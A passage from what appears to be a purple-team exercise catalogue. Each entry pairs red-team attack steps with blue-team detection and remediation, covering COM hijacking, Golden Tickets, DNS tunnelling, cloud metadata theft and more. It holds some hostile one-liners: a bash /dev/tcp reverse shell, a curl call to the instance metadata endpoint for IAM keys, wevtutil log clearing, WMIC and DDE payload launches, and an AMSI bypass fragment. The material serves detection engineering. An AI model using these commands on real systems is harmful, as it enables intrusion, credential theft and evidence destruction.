- **Solution**: Restrict app registration, monitor consent grants
- **Tags**: #oauth #cloudexfil #o365

## Abusing COM Hijacking for Persistence

- **Attack Type**: Persistence via Registry
- **Target**: Windows Workstation
- **Vulnerability**: Weak COM object path validation
- **MITRE**: T1546.015
- **Impact**: Persistent stealthy code execution
- **Tools**: Autoruns, ProcMon, Sysinternals, Regedit
- **Scenario**: Test whether COM hijack persistence is detected through registry and process behavior
- **Attack Steps**: 1. Red Team identifies a vulnerable COM CLSID (e.g., HKCU\Software\Classes\CLSID\{CLSID}\InProcServer32) known to trigger on application start.2. Modifies the registry to point the CLSID to a malicious DLL.3. Waits for the host to reboot or the triggering application to be launched (like mmc.exe).4. The malicious DLL is silently loaded without creating new services or scheduled tasks.5. Blue Team monitors Sysmon Event ID 13 (Registry Value Set) and EID 7 (Image Load) for unusual DLLs loaded by benign parent processes.6. ProcMon trace reveals DLL load path anomalies.7. Purple Team checks if alerts are triggered based on unsigned DLLs loading from non-standard directories and whether registry persistence detection is comprehensive.
- **Detection**: Sysmon EID 13 & 7, Registry monitoring
- **Solution**: Block write access to critical CLSIDs, enforce DLL signature checks
- **Tags**: #comhijacking #dllpersistence #registryabuse

## Golden Ticket Attack Simulation

- **Attack Type**: Credential Forgery
- **Target**: Domain Controller
- **Vulnerability**: krbtgt hash theft and ticket injection
- **MITRE**: T1558.001
- **Impact**: Full domain compromise, stealth admin access
- **Tools**: Mimikatz, Rubeus, KDC Event Logs
- **Scenario**: Test if forged Kerberos tickets bypass detection and if TGT anomalies are caught
- **Attack Steps**: 1. Red Team dumps the krbtgt account hash from a domain controller (via DCSync or LSASS dump).2. Uses Mimikatz to craft a valid-looking Kerberos TGT (Golden Ticket) with arbitrary user and group membership (e.g., Domain Admins).3. Injects the ticket into a session using kerberos::ptt.4. Red Team accesses domain resources, admin shares, or sensitive servers.5. Blue Team reviews Kerberos Event IDs 4768, 4769, and 4770 for TGTs with unusual lifespans or non-matching users.6. Also checks for high-value group SIDs in users not known to be admins.7. Purple Team verifies if TGT validation and alerting for forged ticket use were triggered, or if additional correlation is needed.
- **Detection**: KDC logs, SIDs mismatch, TGT anomaly detection
- **Solution**: Rotate krbtgt key periodically, detect SID misuse
- **Tags**: #goldenticket #kerberos #tgt

## WinRM Remote Execution and Script Transfer

- **Attack Type**: Remote Command Execution
- **Target**: Windows Server
- **Vulnerability**: WinRM not segmented or restricted
- **MITRE**: T1028
- **Impact**: Remote access and payload execution
- **Tools**: PowerShell Remoting, WinRM, Sysmon
- **Scenario**: Emulate attacker abuse of WinRM for executing PowerShell scripts remotely
- **Attack Steps**: 1. Red Team ensures WinRM is enabled and uses Enter-PSSession or Invoke-Command with valid credentials.2. Transfers PowerShell script from local attacker machine using Invoke-Command -ScriptBlock or New-PSSession with file copying.3. Executes script remotely to establish persistence or dump credentials.4. Blue Team uses Sysmon Event ID 3 (network connection), 1 (process creation), and Windows Event ID 4648 to trace remote use of PowerShell.5. SIEM correlates script block logging with remoting sessions.6. Purple Team validates alerting logic for authorized credential use over WinRM and examines if script transfers were flagged or missed.7. They recommend tagging WinRM + PowerShell combinations as higher risk.
- **Detection**: Sysmon EID 1, 3, PowerShell logging
- **Solution**: Restrict WinRM to IT VLANs, monitor script execution
- **Tags**: #winrm #powershellremoting #remoteexecution

## Abuse of Microsoft Office DDE for Execution

- **Attack Type**: Initial Access
- **Target**: Employee Endpoint
- **Vulnerability**: Enabled DDE, low user awareness
- **MITRE**: T1203
- **Impact**: Initial code execution via document
- **Tools**: Word/Excel, DDE Auto Execution, Defender Logs
- **Scenario**: Validate if Dynamic Data Exchange (DDE) abuse triggers alerts or bypasses macro policies
- **Attack Steps**: 1. Red Team crafts a .docx or .xlsx file with embedded DDE field like cmd.exe /c powershell -Command <payload>.2. Sends via phishing email to a user in the organization.3. Upon opening, Office triggers the DDE field, launching the payload without macros being enabled.4. Blue Team inspects Event ID 1 (Sysmon process creation), parent-child anomaly (WINWORD → cmd → powershell).5. Defender may flag indirect execution paths.6. Purple Team evaluates user awareness controls and SIEM logic for DDE-based exploits that bypass macro restrictions.7. Feedback leads to inclusion of non-macro document execution detection logic in baseline monitoring.
- **Detection**: Sysmon EID 1, Office logs, Defender alerts
- **Solution**: Disable DDE, monitor parent-child process paths
- **Tags**: #dde #initialaccess #officeexploits

## External Recon via Office365 Search

- **Attack Type**: Open Source Intelligence (OSINT)
- **Target**: Microsoft Cloud
- **Vulnerability**: Public API exposure
- **MITRE**: T1592, T1589
- **Impact**: External recon, target mapping
- **Tools**: curl, Postman, Microsoft Graph Explorer
- **Scenario**: Simulate threat actor using O365 search tools (Autodiscover, Graph) for recon
- **Attack Steps**: 1. Red Team gathers employee emails from LinkedIn or data leaks.2. Uses Autodiscover endpoint (https://autodiscover-s.outlook.com/autodiscover/autodiscover.json) to validate users.3. Leverages Microsoft Graph API for public data queries (calendars, group memberships, SharePoint access).4. Blue Team monitors for repeated failed lookups, token grants to suspicious apps, and excessive external API calls.5. Defender for Cloud Apps detects anomalous behavior originating from unusual locations.6. Purple Team ensures rate-limiting, detection of enumeration APIs, and OAuth audit logs are enabled.7. Improvements are made to detect external enumeration campaigns that precede phishing.
- **Detection**: Graph logs, MCAS anomaly alerts
- **Solution**: Rate-limit APIs, disable unused Graph scopes
- **Tags**: #o365 #osint #graphexploitation

## Audio/Microphone Hijack via Malicious App

- **Attack Type**: Surveillance
- **Target**: User Laptop
- **Vulnerability**: No monitoring of audio access
- **MITRE**: T1123
- **Impact**: Espionage, privacy violation
- **Tools**: OBS, Custom Python Script, Process Monitor
- **Scenario**: Test detection of malicious access to microphone or camera peripherals
- **Attack Steps**: 1. Red Team deploys a payload that accesses the microphone using Windows API calls (e.g., waveInOpen, MMDeviceEnumerator).2. The payload records audio periodically and streams to C2 over encrypted channel.3. Execution happens in stealth (background process or disguised app).4. Blue Team detects anomalies using EDR hooks that track microphone access and system-level audio APIs.5. They correlate application behavior (audio access) with unusual parent processes and lack of GUI window.6. Purple Team evaluates alerting, whitelisting, and whether microphone access monitoring is even turned on.7. Suggests implementing telemetry for peripheral access across endpoints.
- **Detection**: EDR, Peripheral access logs
- **Solution**: Monitor audio/camera usage, limit app permissions
- **Tags**: #audiohijack #t1123 #espionage

## Fileless Malware via WMI + PowerShell Combo

- **Attack Type**: Memory-Only Attack
- **Target**: Windows Host
- **Vulnerability**: WMI and PowerShell chaining
- **MITRE**: T1059.001 + T1047
- **Impact**: Stealthy memory-only persistence
- **Tools**: WMI, PowerShell, Empire
- **Scenario**: Execute malware entirely in memory via WMI trigger and PowerShell stager
- **Attack Steps**: 1. Red Team creates a WMI subscription that triggers on event (e.g., time, login) and executes encoded PowerShell.2. The PowerShell script downloads shellcode into memory and injects into legitimate process (e.g., explorer.exe).3. No files are dropped on disk, avoiding AV detection.4. Blue Team detects anomalies in WMI activity and PowerShell logs (Event ID 4104).5. Sysmon EID 1 helps trace unusual command-line usage.6. Purple Team assesses whether AV/EDR caught the injection and if telemetry exists for WMI trigger correlation.7. Recommendations are made for improved memory execution alerting.
- **Detection**: Script block logs, EDR memory analysis
- **Solution**: Detect injection, disable unneeded WMI triggers
- **Tags**: #fileless #memoryonly #wmiexecution

## Cloud VM Metadata API Exploitation

- **Attack Type**: Cloud Credential Theft
- **Target**: Cloud VM
- **Vulnerability**: Open access to metadata URL
- **MITRE**: T1522
- **Impact**: Cloud credential compromise
- **Tools**: cURL, Metadata Endpoints (AWS/GCP/Azure)
- **Scenario**: Simulate abuse of metadata endpoints in cloud VMs to extract keys
- **Attack Steps**: 1. Red Team accesses a cloud VM instance (e.g., via misconfigured SSH or webshell).2. Uses curl http://169.254.169.254/latest/meta-data/ (AWS) to retrieve IAM credentials.3. Uses those credentials to pivot into other cloud services or escalate permissions.4. Blue Team monitors for unusual metadata API calls, especially from non-initialization scripts.5. CloudTrail and GuardDuty logs highlight use of short-term credentials from odd regions/IPs.6. Purple Team evaluates if lateral pivoting from VM to IAM roles is visible, and if alerts are tuned.7. Recommends disabling IMDSv1 or restricting via firewall.
- **Detection**: GuardDuty, flow logs, CloudTrail
- **Solution**: Enforce IMDSv2, restrict metadata access
- **Tags**: #cloud #aws #metadataapi

## Malicious Browser Extension Activity

- **Attack Type**: User-Level Persistence
- **Target**: Employee Workstation
- **Vulnerability**: Unrestricted browser plugins
- **MITRE**: T1176
- **Impact**: Credential theft, monitoring
- **Tools**: Chrome Extension, WebSocket, JavaScript
- **Scenario**: Use a rogue browser extension to exfiltrate data and monitor user activity
- **Attack Steps**: 1. Red Team creates a Chrome extension requesting excessive permissions (tabs, cookies, clipboard).2. Lures user to install via phishing page or fake plugin store.3. Extension monitors keystrokes, clipboard, sends data over WebSocket to attacker.4. Blue Team monitors unusual extension permissions, anomalous browser behavior.5. Uses browser telemetry from EDR or MDM tools to trace unauthorized extension installs.6. Purple Team evaluates gaps in endpoint extension visibility and recommends enhanced browser controls.7. Recommends alerting on extensions with certain behavior keywords (e.g., onKeyDown, document.write, C2 hosts).
- **Detection**: Browser EDRs, Chrome audit tools
- **Solution**: Lock down extensions, review extension manifests
- **Tags**: #browserspy #extensionattack #keystroke

## Automated Exploit Framework Simulation

- **Attack Type**: Exploitation Framework
- **Target**: Internal Server
- **Vulnerability**: Known unpatched CVE
- **MITRE**: T1203
- **Impact**: Remote code execution, persistence
- **Tools**: Metasploit, CVE Payloads, Snort, Suricata
- **Scenario**: Validate real-time alerting when metasploit/exploit-db tools are used
- **Attack Steps**: 1. Red Team scans network with Nmap for vulnerable services and ports.2. Identifies CVE-2021-21972 vulnerability on a target (VMware vSphere plugin).3. Launches Metasploit exploit module, gets shell, and uploads secondary tools.4. Blue Team uses IDS tools (Suricata, Snort) to detect exploit signatures and shell callbacks.5. Correlates exploit attempts with known IOC rule matches and binary hash alerts.6. Purple Team assesses whether exploit signatures were up to date and whether alerting was real-time.7. Improvements include better integration of exploit DB feeds and custom rules for local software stack.
- **Detection**: Suricata, Snort, EDR alerts
- **Solution**: Patch management, IPS alert tuning
- **Tags**: #cveexploit #metasploit #intrusiondetection

## Endpoint EDR Bypass via Direct Syscall Injection

- **Attack Type**: Endpoint (EDR Blindspot)
- **Target**: Windows Workstation
- **Vulnerability**: Lack of kernel-level syscall monitoring
- **MITRE**: T1055.001
- **Impact**: Stealth code execution, full EDR evasion
- **Tools**: Cobalt Strike, SysWhispers2, Custom Injector
- **Scenario**: Test whether EDR detects process injection via direct system calls instead of standard WinAPI
- **Attack Steps**: 1. Red Team deploys a payload using SysWhispers2 that directly calls Windows system APIs like NtCreateThreadEx instead of using typical CreateRemoteThread WinAPI wrappers.2. The payload injects shellcode into a benign process like notepad.exe.3. Because EDRs often hook user-level APIs, this technique bypasses those hooks.4. No parent-child anomalies are triggered.5. Blue Team reviews Sysmon logs and EDR dashboards but sees no alert.6. Purple Team identifies a blindspot in kernel-level visibility and documents the evasion path.
- **Detection**: None; detection fails due to technique
- **Solution**: Implement kernel-mode telemetry and direct syscall detection
- **Tags**: #edrbypass #syswhispers #endpoint

## DNS Tunneling Goes Undetected Over TXT Records

- **Attack Type**: Network (C2 Channel)
- **Target**: Corporate Network
- **Vulnerability**: Lack of deep DNS inspection
- **MITRE**: T1071.004
- **Impact**: Covert exfiltration without alert
- **Tools**: dnscat2, iodine, Wireshark
- **Scenario**: Simulate DNS tunneling using TXT record payloads to test whether exfiltration is logged
- **Attack Steps**: 1. Red Team sets up a C2 server that receives command-and-control instructions encoded in DNS queries using dnscat2 or iodine.2. Queries are sent as subdomains of an attacker-controlled domain (e.g., cmd.domain.attacker.com).3. The payloads use DNS TXT records to send/receive data, evading perimeter firewalls.4. Blue Team checks traditional IDS logs and SIEM, but no alerts are triggered.5. Purple Team verifies that DNS logs are missing or retention is too short, and detection rules don’t cover payload entropy or beacon frequency.
- **Detection**: Manual detection via Wireshark, if at all
- **Solution**: Enable full DNS logging and alert on long/high-frequency TXT queries
- **Tags**: #dnstunnel #c2 #networkblindspot

## OAuth Consent Abuse Without User Login Events

- **Attack Type**: Cloud (O365 / Azure)
- **Target**: Azure/O365 Environment
- **Vulnerability**: Incomplete OAuth audit coverage
- **MITRE**: T1539
- **Impact**: Unauthorized long-term access to sensitive data
- **Tools**: Evilginx2, Azure Portal, Graph API
- **Scenario**: Simulate an attack where malicious apps gain OAuth access, bypassing login alerts
- **Attack Steps**: 1. Red Team compromises a user's session via Evilginx2 and grants permissions to a malicious Azure app (e.g., read email, OneDrive).2. OAuth tokens allow continuous access to cloud data without re-authentication.3. The attacker uses Microsoft Graph API to read inbox, exfiltrate files.4. Blue Team relies on interactive login alerts, which don’t trigger.5. Purple Team discovers cloud audit logs are not ingested into SIEM or lack visibility into third-party app consents.
- **Detection**: Azure audit logs (if enabled), MCAS
- **Solution**: Enable alerts on new app consents and non-interactive token use
- **Tags**: #oauthabuse #cloudgap #o365

## Fileless PowerShell Payload Not Detected by AV

- **Attack Type**: Endpoint (AV Evasion)
- **Target**: Windows Workstation
- **Vulnerability**: AMSI disabled or bypassed
- **MITRE**: T1059.001
- **Impact**: Fileless payload runs silently
- **Tools**: PowerShell Empire, base64 payloads, AMSI Bypass
- **Scenario**: Emulate use of PowerShell stager loaded via encoded command, bypassing AV signatures
- **Attack Steps**: 1. Red Team crafts a base64-encoded payload and injects it using a PowerShell command: powershell -enc <payload>.2. They apply known AMSI bypasses ([Ref].Assembly.GetType...) to avoid script scanning.3. Payload executes in-memory without touching disk.4. Blue Team’s AV and Defender remain silent due to evasion of signature and AMSI.5. Purple Team notes the lack of script block logging and AMSI alerting, recommending controls.
- **Detection**: Defender bypassed, no logs in Event Viewer
- **Solution**: Enable script block logging, monitor PowerShell behavior
- **Tags**: #powershell #amsibypass #fileless

## Incomplete Asset Inventory: Rogue Device Undetected

- **Attack Type**: Cross-Domain
- **Target**: Internal Network
- **Vulnerability**: Missing inventory correlation and NAC
- **MITRE**: T1201 (Indirect)
- **Impact**: Unauthorized devices blend into network
- **Tools**: Rogue laptop, WiFi/Ethernet spoofing
- **Scenario**: Add unmanaged device to network to test visibility coverage
- **Attack Steps**: 1. Red Team connects a rogue laptop to the corporate LAN or Wi-Fi.2. The device has a fake MAC address resembling a legitimate vendor.3. No NAC (Network Access Control) is in place.4. The device is used to scan internal IPs, mimic legitimate hostnames, and pass as a dev machine.5. Blue Team has no record of this device in CMDB or SIEM.6. Purple Team confirms a major visibility gap in asset management and network access controls.
- **Detection**: None — no logs for unmanaged assets
- **Solution**: Implement NAC, reconcile asset inventory with SIEM
- **Tags**: #rogueasset #visibilitygap #inventory

## Suspicious SMB Lateral Movement Not Correlated

- **Attack Type**: Network
- **Target**: Internal Hosts
- **Vulnerability**: Lack of flow + endpoint correlation
- **MITRE**: T1021.002
- **Impact**: Missed lateral movement trail
- **Tools**: PsExec, SMB logs, Sysmon
- **Scenario**: Emulate PsExec-based lateral movement and test whether network-level correlation exists
- **Attack Steps**: 1. Red Team uses PsExec to move laterally across machines with valid domain creds.2. Traffic occurs over port 445, writing payload to ADMIN$ and creating remote service.3. Blue Team reviews endpoint logs but lacks correlation with NetFlow or SMB traffic.4. Network sensors don’t parse SMB session metadata.5. Purple Team documents that SIEM cannot match lateral movement paths across endpoint and network.
- **Detection**: Weak alerting on SMB behavior + Sysmon
- **Solution**: Integrate NetFlow + EDR alerts for path correlation
- **Tags**: #psexec #networkgap #lateralmove

## Public Cloud S3 Bucket Access Goes Unnoticed

- **Attack Type**: Cloud (AWS)
- **Target**: AWS Cloud
- **Vulnerability**: Open bucket + missing logs
- **MITRE**: T1537
- **Impact**: Data breach via misconfig
- **Tools**: AWS CLI, Open S3 Bucket, CloudTrail
- **Scenario**: Simulate access to exposed or misconfigured S3 buckets and check if alerts fire
- **Attack Steps**: 1. Red Team locates misconfigured public S3 bucket (public-read) and downloads sensitive objects.2. They also enumerate ACLs, trying anonymous or cross-account access.3. Blue Team fails to alert because S3 access logging isn't enabled.4. CloudTrail logs are present but not ingested by SIEM.5. Purple Team flags the lack of alerting on external IPs accessing buckets and suggests CloudWatch integration.
- **Detection**: None or CloudTrail, if parsed
- **Solution**: Enable S3 access logs, alert on external access
- **Tags**: #s3leak #cloudstorage #visibility

## SSL Inspection Bypass via QUIC/DoH

- **Attack Type**: Network (Encrypted Traffic)
- **Target**: Corporate Network
- **Vulnerability**: Encrypted protocols not decrypted
- **MITRE**: T1071.001 + T1071.004
- **Impact**: Covert communication blindspot
- **Tools**: Chrome, C2 over QUIC, Google DNS, Wireshark
- **Scenario**: Send malicious traffic using QUIC (HTTP/3) or DNS-over-HTTPS and test for visibility
- **Attack Steps**: 1. Red Team sets up C2 communication over QUIC (HTTP/3) or DNS-over-HTTPS (DoH).2. Uses modern browsers and malware that leverages encrypted channels.3. Traffic flows through firewalls uninspected due to lack of decryption support.4. Blue Team’s proxies or IDS don’t alert or log content.5. Purple Team confirms inspection rules cover only HTTPS (TLS) and not QUIC/DoH.
- **Detection**: Weak SSL inspection, missing QUIC support
- **Solution**: Enable QUIC/DoH inspection, block unsupported protocols
- **Tags**: #quic #doh #networkblindspot

## MFA Disabled Without Alerts

- **Attack Type**: Cloud (Azure)
- **Target**: Azure Tenant
- **Vulnerability**: Weak alerting on MFA policy change
- **MITRE**: T1556.006
- **Impact**: Account takeover persistence
- **Tools**: Azure AD, Admin Portal, Graph API
- **Scenario**: Simulate attacker disabling MFA on compromised accounts and test alerting
- **Attack Steps**: 1. Red Team compromises an Azure account with portal access.2. Navigates to security settings and disables MFA for that user or adds a new trusted device.3. No alert is generated in SIEM.4. Azure logs the event but ingestion rules ignore MFA policy changes.5. Purple Team verifies alert gaps on critical identity configuration changes.
- **Detection**: Azure logs (if parsed), MCAS
- **Solution**: Alert on identity config changes, enforce conditional access
- **Tags**: #mfa #cloudconfig #azure

## EDR Process Tree Blindspot via Scheduled Task

- **Attack Type**: Endpoint
- **Target**: Windows Host
- **Vulnerability**: EDR not mapping scheduled tasks
- **MITRE**: T1053.005
- **Impact**: Stealth execution, weak attribution
- **Tools**: schtasks.exe, malicious payload
- **Scenario**: Simulate launching malware via Task Scheduler to avoid parent-child correlation
- **Attack Steps**: 1. Red Team creates a scheduled task via schtasks.exe /create or directly via registry.2. The task is set to run every 5 mins, launching payload.exe with no visible parent.3. EDR fails to link execution back to initial compromise because of task isolation.4. Blue Team sees the binary execute, but can't trace origin.5. Purple Team highlights lack of correlation between scheduler activity and resulting processes.
- **Detection**: Process creation logs but no task origin
- **Solution**: Monitor schtasks, correlate with child execution
- **Tags**: #scheduledtask #edrblind #persistence

## Exploiting Inactive Cloud API Logging

- **Attack Type**: Cloud (AWS/Azure/GCP)
- **Target**: Cloud Account
- **Vulnerability**: Disabled/partial logging on APIs
- **MITRE**: T1078 + T1098.003
- **Impact**: Privilege escalation without trace
- **Tools**: CloudShell, AWS CLI, Azure CLI
- **Scenario**: Abuse unmonitored cloud APIs for privilege escalation
- **Attack Steps**: 1. Red Team uses CloudShell or CLI tools to perform privilege escalation using APIs such as iam:PassRole, sts:AssumeRole, or gcloud projects set-iam-policy.2. These calls are not logged due to disabled API logging or unmonitored APIs.3. The escalation is completed without triggering alerts.4. Blue Team relies on general CloudTrail logs, but these specific APIs are not monitored.5. Purple Team notes missing visibility over identity privilege elevation mechanisms.
- **Detection**: CloudTrail/Stackdriver logs (if enabled)
- **Solution**: Enable comprehensive API logging for IAM & STS
- **Tags**: #cloudapi #escalation #loggap

## Unsanctioned SaaS Usage (Shadow IT) Visibility Gap

- **Attack Type**: Cloud / Network
- **Target**: End User Browsers
- **Vulnerability**: Lack of SaaS traffic tagging
- **MITRE**: T1567.002
- **Impact**: Shadow data exfiltration
- **Tools**: Shadow IT Discovery, MCAS, Wireshark
- **Scenario**: Users accessing SaaS apps not visible in central SIEM
- **Attack Steps**: 1. Red Team simulates an employee uploading sensitive files to unauthorized SaaS apps (e.g., WeTransfer, Telegram Web).2. Traffic is HTTPS-encrypted, so firewall allows it.3. No alerts are generated, and DLP solutions don’t recognize app usage.4. Blue Team does not have MCAS or CASB policies in place.5. Purple Team identifies lack of app discovery visibility, especially for unmanaged browser-based SaaS usage.
- **Detection**: None or post-incident proxy logs
- **Solution**: Deploy MCAS/CASB, monitor unknown domains
- **Tags**: #shadowit #cloudsecurity #saas

## Drive-by Malware Ignored by Incomplete Web Proxy Logs

- **Attack Type**: Network
- **Target**: Browsers / Perimeter Gateway
- **Vulnerability**: Incomplete proxy/SSL visibility
- **MITRE**: T1189
- **Impact**: Silent malware drop
- **Tools**: BeEF, Malicious IFrame, Burp, Apache Logs
- **Scenario**: Simulate user visiting a compromised website serving malware
- **Attack Steps**: 1. Red Team hosts a webpage with hidden iframe redirect to exploit kit.2. Victim visits via browser; malware is dropped silently via browser vulnerability.3. Proxy logs are disabled for HTTPS traffic, so no alert is generated.4. Blue Team cannot trace back the source of infection.5. Purple Team identifies that SSL traffic is uninspected and no TLS SNI or JA3 logging exists.
- **Detection**: Proxy/firewall logs (partial)
- **Solution**: Enable SSL inspection, TLS fingerprinting
- **Tags**: #driveby #httpsblindspot #webproxy

## Lateral Movement via WMI Goes Unlogged

- **Attack Type**: Endpoint / Network
- **Target**: Windows Workstations
- **Vulnerability**: WMI logging not enabled
- **MITRE**: T1047
- **Impact**: Silent lateral movement
- **Tools**: WMIC, PsExec, Event Viewer
- **Scenario**: Test if WMI-based lateral movement shows in logs
- **Attack Steps**: 1. Red Team runs wmic /node:target process call create "cmd.exe /c powershell <payload>".2. No explicit process creation logs are shown on the source system.3. Target logs the PowerShell execution, but attribution is unclear.4. No firewall or EDR logs tie both ends.5. Purple Team confirms that WMI logs (Event ID 5861, 5857) are not forwarded to SIEM.
- **Detection**: WMI logs (if enabled), Sysmon 3
- **Solution**: Enable WMI tracing + network segmentation
- **Tags**: #wmi #lateralmove #loggap

## Encrypted C2 Over Social Media APIs (Exfil via Telegram API)

- **Attack Type**: Network / App Layer
- **Target**: Internal Hosts
- **Vulnerability**: No inspection of social APIs
- **MITRE**: T1102.002
- **Impact**: Covert data exfiltration
- **Tools**: Telegram Bot API, Python, Proxy
- **Scenario**: C2 using Telegram or Slack API goes undetected in egress logs
- **Attack Steps**: 1. Red Team creates a Telegram bot that receives exfiltrated files via API.2. Data is sent via HTTPS POST to api.telegram.org, blending into normal traffic.3. Blue Team sees encrypted traffic to a known domain but can't inspect payloads.4. No DLP rule or anomaly alert is triggered.5. Purple Team highlights lack of granularity in API-level inspection and recommends tagging high-risk API domains.
- **Detection**: Only DNS logs may show usage
- **Solution**: Tag API endpoints, monitor unusual POST volume
- **Tags**: #telegramapi #apiabuse #exfiltration

## Device Control Logs Missing for USB Events

- **Attack Type**: Endpoint
- **Target**: User Workstation
- **Vulnerability**: Lack of device control SIEM integration
- **MITRE**: T1200
- **Impact**: Hardware-based execution and persistence
- **Tools**: Rubber Ducky, USBGuard, Sysmon
- **Scenario**: Simulate malicious USB insertion to test logging
- **Attack Steps**: 1. Red Team inserts a USB Rubber Ducky that emulates keyboard input and runs a payload.2. Endpoint logs device insertion, but no alert is triggered.3. No centralized USB usage monitoring is in place.4. Device Control solution is not configured to alert on mass storage or HID input anomalies.5. Purple Team confirms that USB insertions are logged locally but not correlated or forwarded.
- **Detection**: USB logs (if collected), Sysmon 6
- **Solution**: Forward device events to SIEM, enforce block/allow policies
- **Tags**: #usbattack #devicecontrol #physicalaccess

## Event Log Clearing Goes Undetected

- **Attack Type**: Endpoint
- **Target**: Windows Hosts
- **Vulnerability**: No alerts on log deletion
- **MITRE**: T1070.001
- **Impact**: Erasure of forensic trail
- **Tools**: wevtutil, PowerShell, Event Viewer
- **Scenario**: Simulate attacker clearing Windows event logs to test detection
- **Attack Steps**: 1. Red Team runs wevtutil cl security or Clear-EventLog via PowerShell to remove traces of activity.2. Blue Team receives no alert because log clearing isn’t tracked.3. No tamper alert fires due to lack of Event ID 1102 monitoring.4. Purple Team identifies that SIEM ignores event log administrative events.5. Improvement includes real-time alerts on log wiping and setting retention.
- **Detection**: Windows EID 1102 (if logged)
- **Solution**: Monitor log clearance events centrally
- **Tags**: #logtamper #wevtutil #clearingevidence

## Misconfigured SIEM Rule Suppresses Beaconing Alert

- **Attack Type**: SIEM / Detection Engine
- **Target**: SIEM / Network
- **Vulnerability**: Misconfigured detection rules
- **MITRE**: T1071.001
- **Impact**: Missed C2 detection
- **Tools**: Cobalt Strike, SIEM platform
- **Scenario**: Test if misconfigured detection suppresses valid beaconing C2 alerts
- **Attack Steps**: 1. Red Team sets up C2 traffic with fixed beacon interval (e.g., every 60s).2. Network logs clearly show consistent outbound traffic to static IP.3. SIEM correlation rule is present but misconfigured to ignore heartbeat-like patterns.4. No alert fires; Blue Team is unaware.5. Purple Team reviews rule logic and finds timing thresholds are too lenient.6. Feedback leads to logic correction and addition of entropy-based detection.
- **Detection**: SIEM logs present but misused
- **Solution**: Audit detection logic regularly
- **Tags**: #c2 #detectiongap #siem

## Unmonitored Linux Server Hosts Reverse Shell

- **Attack Type**: Endpoint (Linux)
- **Target**: Linux Server
- **Vulnerability**: Lack of logging agent / EDR on Linux
- **MITRE**: T1059.004
- **Impact**: Full compromise without logs
- **Tools**: Netcat, Bash, Systemd
- **Scenario**: Deploy reverse shell on Linux machine to test EDR/SIEM visibility
- **Attack Steps**: 1. Red Team sets up reverse shell on a Linux box using bash -i >& /dev/tcp/ip/port 0>&1 or systemd service.2. No Linux EDR is installed, and logs are not forwarded.3. Reverse shell opens on port 443, simulating benign HTTPS.4. Blue Team has no visibility into command execution or process tree.5. Purple Team identifies Linux log collection blindspot and recommends OS hardening + auditd.
- **Detection**: None unless Linux audit logs exist
- **Solution**: Install Linux EDR, enable auditd + syslog forwarding
- **Tags**: #linuxgap #reverseshell #visibility

## Unlinked Cloud & On-Prem Identities Hide Lateral Movement

- **Attack Type**: Cross-Domain (Hybrid Infra)
- **Target**: Hybrid Infra
- **Vulnerability**: Lack of identity stitching
- **MITRE**: T1078
- **Impact**: Hidden lateral pivot across infra
- **Tools**: AzureAD, Kerberos, BloodHound
- **Scenario**: Simulate identity pivot from AzureAD to on-prem AD via SSO or synced accounts
- **Attack Steps**: 1. Red Team compromises an AzureAD account synced to on-prem AD (hybrid identity setup).2. Uses SSO to move between cloud → VPN → on-prem resources.3. Blue Team lacks cross-environment user mapping.4. SIEM sees separate login streams with no linkage.5. Purple Team notes detection gap between cloud and domain accounts and recommends UPN correlation.
- **Detection**: Separate logs exist, but uncorrelated
- **Solution**: Correlate cloud-onprem identity in SIEM
- **Tags**: #hybrididentity #aad #pivot

